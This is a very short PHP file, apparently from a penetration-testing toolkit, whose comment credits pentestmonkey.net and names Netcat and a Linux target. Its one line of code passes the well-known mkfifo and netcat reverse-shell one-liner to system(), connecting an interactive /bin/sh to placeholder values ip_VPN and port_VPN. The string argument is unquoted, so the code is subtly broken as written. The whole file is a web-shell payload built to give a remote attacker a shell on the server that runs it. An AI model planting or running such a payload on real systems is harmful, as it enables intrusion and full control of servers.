
	// Linux Targed		Netcat   pentestmonkey.net
<?php
	system(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip_VPN port_VPN >/tmp/f);
?>
